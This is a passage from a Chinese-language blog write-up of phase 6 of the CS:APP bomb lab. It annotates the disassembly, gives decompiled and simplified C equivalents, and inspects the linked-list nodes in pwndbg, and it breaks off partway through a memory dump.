<span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:    add    r12d,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:    cmp    r12d,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:    je     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line">---------------------------- 内层 <span class="keyword">for</span></span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:    mov    ebx,r12d</span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:    movsxd rax,ebx</span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:    mov    eax,DWORD PTR [rsp+rax*<span class="number">4</span>]</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:    cmp    DWORD PTR [rbp+<span class="number">0x0</span>],eax</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:    jne    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:    add    ebx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:    cmp    ebx,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:    jle    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:    add    r13,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:    jmp    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:    lea    rsi,[rsp+<span class="number">0x18</span>]  ; 输入的结尾\<span class="number">0</span></span><br><span class="line">   <span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:   mov    rax,r14</span><br><span class="line">   <span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:   mov    ecx,<span class="number">0x7</span></span><br><span class="line">   <span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:   mov    edx,ecx</span><br><span class="line">   <span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:   sub    edx,DWORD PTR [rax]</span><br><span class="line">   <span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:   mov    DWORD PTR [rax],edx</span><br><span class="line">   <span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:   add    rax,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:   cmp    rax,rsi</span><br><span class="line">   <span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:   jne    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:   mov    esi,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:   jmp    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:   mov    rdx,QWORD PTR [rdx+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:   add    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:   cmp    eax,ecx</span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:   jne    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:   jmp    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:   mov    edx,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:   mov    QWORD PTR [rsp+rsi*<span class="number">2</span>+<span class="number">0x20</span>],rdx</span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:   add    rsi,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:   cmp    rsi,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:   je     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:   mov    ecx,DWORD PTR [rsp+rsi*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:   cmp    ecx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:   jle    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:   mov    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:   mov    edx,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:   jmp    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:   mov    rbx,QWORD PTR [rsp+<span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:   lea    rax,[rsp+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:   lea    rsi,[rsp+<span class="number">0x50</span>]</span><br><span class="line">   <span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:   mov    rcx,rbx</span><br><span class="line">   <span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:   mov    rdx,QWORD PTR [rax]</span><br><span class="line">   <span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:   mov    QWORD PTR [rcx+<span class="number">0x8</span>],rdx</span><br><span class="line">   <span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:   add    rax,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:   cmp    rax,rsi</span><br><span class="line">   <span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:   je     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:   mov    rcx,rdx</span><br><span class="line">   <span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:   jmp    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:   mov    QWORD PTR [rdx+<span class="number">0x8</span>],<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:   mov    ebp,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:   mov    rax,QWORD PTR [rbx+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:   mov    eax,DWORD PTR [rax]</span><br><span class="line">   <span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:   cmp    DWORD PTR [rbx],eax</span><br><span class="line">   <span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:   jge    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:   call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:   mov    rbx,QWORD PTR [rbx+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:   sub    ebp,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:   jne    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:   add    rsp,<span class="number">0x50</span></span><br><span class="line">   <span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:   pop    rbx</span><br><span class="line">   <span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:   pop    rbp</span><br><span class="line">   <span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:   pop    r12</span><br><span class="line">   <span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:   pop    r13</span><br><span class="line">   <span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:   pop    r14</span><br><span class="line">   <span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><hr><p>太复杂了，化整为零，一步步来</p><h2 id="Part-6-1-预检测">Part 6.1 预检测</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x00000000004010f4</span> &lt;+<span class="number">0</span>&gt;:     push   r14</span><br><span class="line">   <span class="number">0x00000000004010f6</span> &lt;+<span class="number">2</span>&gt;:     push   r13</span><br><span class="line">   <span class="number">0x00000000004010f8</span> &lt;+<span class="number">4</span>&gt;:     push   r12</span><br><span class="line">   <span class="number">0x00000000004010fa</span> &lt;+<span class="number">6</span>&gt;:     push   rbp</span><br><span class="line">   <span class="number">0x00000000004010fb</span> &lt;+<span class="number">7</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x00000000004010fc</span> &lt;+<span class="number">8</span>&gt;:     sub    rsp,<span class="number">0x50</span></span><br><span class="line">   <span class="number">0x0000000000401100</span> &lt;+<span class="number">12</span>&gt;:    mov    r13,rsp</span><br><span class="line">   <span class="number">0x0000000000401103</span> &lt;+<span class="number">15</span>&gt;:    mov    rsi,rsp</span><br><span class="line">   <span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:    call   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;  ; <span class="number">6</span>个输入数字读在rsp, rsi在进入read函数后被改</span><br><span class="line">---------------------------- 外层<span class="keyword">for</span>, 索引为r12</span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:    mov    r14,rsp</span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:    mov    r12d,<span class="number">0x0</span>  ; r12初始化为<span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:    mov    rbp,r13</span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:    mov    eax,DWORD PTR [r13+<span class="number">0x0</span>]  ; rbp,r14,r13都等于rsp</span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:    sub    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:    cmp    eax,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:    jbe    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt;  ; <span class="number">6</span>个元素都: <span class="number">-1</span>后小于等于<span class="number">5</span></span><br><span class="line">   <span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:    add    r12d,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:    cmp    r12d,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:    je     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line">---------------------------- 内层<span class="keyword">for</span>, 索引为ebx</span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:    mov    ebx,r12d</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:    movsxd rax,ebx  ; rax = r12 = i</span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:    mov    eax,DWORD PTR [rsp+rax*<span class="number">4</span>]</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:    cmp    DWORD PTR [rbp+<span class="number">0x0</span>],eax ; rbp指向rsp, 输入第<span class="number">1</span>个元素</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:    jne    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:    add    ebx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:    cmp    ebx,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:    jle    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:    add    r13,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:    jmp    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> *v1; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 j; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v15[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+18h] [rbp-60h] BYREF 18h就是24l，也就是输入字符串结尾\0的位置                  </span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+28h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">40</span>]; <span class="comment">// [rsp+50h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = v15;</span><br><span class="line">  <span class="built_in">read_six_numbers</span>(a1, (__int64)v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      <span class="built_in">explode_bomb</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v1 == v15[v3] )</span><br><span class="line">        <span class="built_in">explode_bomb</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其实就是等价于：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>  (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] - <span class="number">1</span> &gt; <span class="number">5</span>) <span class="built_in">bomb</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i+<span class="number">1</span>; j &lt;= <span class="number">5</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[j] == arr[i]) <span class="built_in">bomb</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 也就是需要输入的6个数字都不大于6，且互异</span></span><br></pre></td></tr></table></figure><aside>💡 笔记：pwndbg中stack区向左指的箭头代表存放的数据是多少；向右指的箭头表示存放的地址是多少（最右边通常会有个向左箭头，代表最终指向的数据）</aside><h2 id="Part-6-2-七减处理">Part 6.2 七减处理</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> ---------------------------- <span class="keyword">for</span>: 使用rax作为循环变量，初始化为r14=rsp</span><br><span class="line"><span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:    lea    rsi,[rsp+<span class="number">0x18</span>]  ; 输入的结尾\<span class="number">0</span></span><br><span class="line"><span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:   mov    rax,r14  ; r14初始时指向rsp, 输入的首地址</span><br><span class="line"><span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:   mov    ecx,<span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:   mov    edx,ecx</span><br><span class="line"><span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:   sub    edx,DWORD PTR [rax]</span><br><span class="line"><span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:   mov    DWORD PTR [rax],edx</span><br><span class="line"><span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:   add    rax,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:   cmp    rax,rsi</span><br><span class="line"><span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:   jne    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:   mov    esi,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:   jmp    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br></pre></td></tr></table></figure><p>程序目的是，原地修改数组：元素值 = 7 - 元素值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">  arr[i] = <span class="number">7</span> - arr[i]</span><br><span class="line"><span class="comment">// 下面将转变后的arr数组称呼为narr</span></span><br></pre></td></tr></table></figure><h2 id="Part-6-3-根据输入narr-i-将node-narr-i-的地址复制到stack-nnode-i">Part 6.3 根据输入narr[i]将node[narr[i]]的地址复制到stack[nnode[i]]</h2><p>程序入口为&lt;phase_6+163&gt;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">---------------------------- 内层 <span class="keyword">for</span> eax: <span class="number">1</span> ~ rcx<span class="number">-1</span>, rcx = narr[i]</span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:   mov    rdx,QWORD PTR [rdx+<span class="number">0x8</span>]  ; node[i] = node[i + <span class="number">1</span>], 一次移动<span class="number">4</span>个字(<span class="number">1</span>个node),注意这里只移动rdx,不改变node</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:   add    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:   cmp    eax,ecx</span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:   jne    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:   jmp    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:   mov    edx,<span class="number">0x6032d0</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:   mov    QWORD PTR [rsp+rsi*<span class="number">2</span>+<span class="number">0x20</span>],rdx  ; 前面的rsp~rsp+<span class="number">0x20</span>放输入(<span class="number">6B</span>)和结束标志, 这里开始放node, 一次操作<span class="number">8</span>字节(QWORD)</span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:   add    rsi,<span class="number">0x4</span>  ; <span class="number">1</span>个node是<span class="number">4B</span>  ; 对narr中的每个数字</span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:   cmp    rsi,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:   je     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line"></span><br><span class="line">---------------------------- 外层 <span class="keyword">for</span> rsi &lt;- i, i: <span class="number">0</span> ~ <span class="number">5</span></span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:   mov    ecx,DWORD PTR [rsp+rsi*<span class="number">1</span>]  ; rsi在jmp前初始化为<span class="number">0</span>, 在+<span class="number">153</span>-+<span class="number">161</span>进行变动和判断</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:   cmp    ecx,<span class="number">0x1</span>  ; 判断数组中每个数是否小于等于<span class="number">1</span></span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:   jle    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:   mov    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:   mov    edx,<span class="number">0x6032d0</span>  ; rdx指向node1</span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:   jmp    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br></pre></td></tr></table></figure><p>等价代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">  stack[nnode[i]] = node[narr[i]]  <span class="comment">// nnode表示栈上放node的地址，其位置与i相关，值由narr[i]确定</span></span><br><span class="line"><span class="comment">// 栈上存放的是node的地址（1qword = 64b），不是完整的node</span></span><br></pre></td></tr></table></figure><p>+176处有个奇怪的地址，可以往下按16进制格式查30个word的数据，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>wx <span class="number">0x6032d0</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:       <span class="number">0x0000014c</span>      <span class="number">0x00000001</span>      <span class="number">0x006032e0</span>      <span class="number">0x00000000</span>  ; <span class="number">0x006032e0</span>就是下一个node的地址</span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:       <span class="number">0x000000a8</span>      <span class="number">0x00000002</span>      <span class="number">0x006032f0</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:       <span class="number">0x0000039c</span>      <span class="number">0x00000003</span>      <span class="number">0x00603300</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:       <span class="number">0x000002b3</span>      <span class="number">0x00000004</span>      <span 